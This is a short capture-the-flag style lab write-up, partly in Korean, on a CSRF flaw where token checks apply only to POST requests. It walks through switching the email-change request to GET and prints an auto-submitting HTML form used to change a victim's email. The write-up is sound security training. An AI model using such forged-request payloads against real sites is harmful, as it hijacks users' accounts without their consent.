# 🚩Lab: CSRF where token validation depends on request method

This lab's email change functionality is vulnerable to CSRF. It attempts to block CSRF attacks, but only applies defenses to certain types of requests.

To solve the lab, use your exploit server to host an HTML page that uses a CSRF attack to change the viewer's email address.

You can log in to your own account using the following credentials: `wiener:peter`

### 🔍 분석 및 공격 과정
1. wiener:peter로 로그인한다.
2. 이메일을 변경하는 요청을 프록시로 가로챈다.
3. method를 get으로 바꾸고, 바디를 지우고, 쿼리스트링으로 이메일의 값만 전달한다.
4. 성공적으로 이메일이 변경되는 것을 볼 수 있다.
5. 이 경우는 GET에 대한 요청에서 CSRF 토큰 검증을 구현하지 않아, GET으로 이메일 변경 요청을 보내면 검증 단계를 우회할 수 있다.
6. 이 과정을 수행하는 HTML 페이지를 만들어 exploit서버로 전송해보자. 참고로 `form` 태그에서 메소드를 지정 안하면 기본 메소드는 GET으로 지정된다.
```html
<form action="이메일변경API">
    <input name="email" value="a@d">
</form>
<script>
    document.forms[0].submit();
</script>
```
7. solve
                        
### 💡 취약점 원리
 이메일 변경 API에서 POST 메소드에 대한 CSRF 검증이 잘 구현되어 있으나, GET에 대한 구현이 취약했다.
